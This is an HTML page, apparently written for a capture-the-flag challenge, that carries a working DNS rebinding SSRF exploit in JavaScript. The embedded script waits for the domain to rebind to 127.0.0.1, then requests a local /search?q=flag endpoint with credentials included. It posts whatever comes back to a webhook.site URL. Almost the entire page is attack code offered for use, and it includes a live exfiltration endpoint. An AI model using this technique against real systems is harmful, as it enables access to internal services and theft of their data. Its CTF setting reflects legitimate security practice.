<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Advanced DNS Rebinding SSRF Exploit</title>
<script>
(async () => {
  // 你的 webhook 網址，記得換成你的
  const WEBHOOK_URL = "https://webhook.site/eed6e086-4677-4691-8515-ecf1b5559f63";

  // 用於檢查 DNS 是否已經切到 127.0.0.1
  async function checkRebind() {
    try {
      const res = await fetch("/rebind_check", {cache: "no-store"});
      if (res.ok) {
        const text = await res.text();
        return text.includes("127.0.0.1") || text.includes("localhost");
      }
      return false;
    } catch {
      return false;
    }
  }

  // Step 1: 等待 DNS rebinding 生效（定期 ping 伺服器檢查是否切到localhost）
  async function waitForRebind(timeout = 15000, interval = 1000) {
    const start = Date.now();
    while (Date.now() - start < timeout) {
      if (await checkRebind()) {
        return true;
      }
      await new Promise(r => setTimeout(r, interval));
    }
    return false;
  }

  // Step 2: 當 DNS rebinding 生效後，訪問 CTF server /search 並拿資料
  async function fetchFlag() {
    try {
      const res = await fetch("/search?q=flag", {
        method: "GET",
        credentials: "include",
        cache: "no-store",
      });
      if (!res.ok) throw new Error(`HTTP status ${res.status}`);
      const data = await res.json();
      console.log("Flag data:", data);
      return data;
    } catch (e) {
      console.error("Fetch flag failed:", e);
      return {error: e.message};
    }
  }

  // Step 3: 把拿到的資料送到 webhook
  async function sendToWebhook(data) {
    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data),
      });
      console.log("Sent data to webhook.");
    } catch (e) {
      console.error("Send webhook failed:", e);
    }
  }

  // 主流程
  console.log("[*] Waiting for DNS rebinding to 127.0.0.1...");
  const rebindSuccess = await waitForRebind();
  if (!rebindSuccess) {
    console.log("[!] DNS rebinding did not occur in time.");
    await sendToWebhook({error: "DNS rebinding timeout"});
    return;
  }

  console.log("[*] DNS rebinding succeeded, fetching flag...");
  const flagData = await fetchFlag();
  await sendToWebhook(flagData);

})();
</script>
</head>
<body>
<h1>Advanced DNS Rebinding SSRF Exploit</h1>
<p>If everything works, the local data will be sent to webhook.</p>
</body>
</html>
